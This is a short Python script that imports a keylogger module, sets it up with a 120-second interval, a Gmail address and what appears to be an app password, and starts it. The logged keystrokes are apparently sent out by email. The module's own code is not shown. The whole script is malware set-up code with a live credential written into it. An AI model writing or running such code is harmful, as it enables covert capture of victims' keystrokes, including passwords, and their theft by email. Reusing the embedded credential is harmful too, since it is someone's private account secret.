import keylogger

my_keylogger = keylogger.Keylogger(120,"sulaimaneksambi@gmail.com","wmzzdxotxypxpmze")
try:
    my_keylogger.start()
except KeyboardInterrupt:
    my_keylogger.stop()